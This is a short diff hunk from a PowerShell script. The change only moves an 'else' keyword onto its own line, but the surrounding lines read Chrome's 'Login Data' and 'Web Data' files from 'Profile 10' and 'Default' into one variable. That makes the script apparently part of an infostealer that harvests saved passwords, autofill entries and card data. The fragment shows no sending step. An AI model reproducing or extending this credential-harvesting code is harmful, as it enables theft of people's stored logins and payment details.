@@ -48,7 +48,8 @@ if (Test-Path -Path "Profile 1") {
     $var += cat -Path "Profile 10\Login Data"
 
     $var += cat -Path "Profile 10\Web Data"
-} else {
+} 
+else {
     cd Default
     
     $var += Get-Content "Login Data"
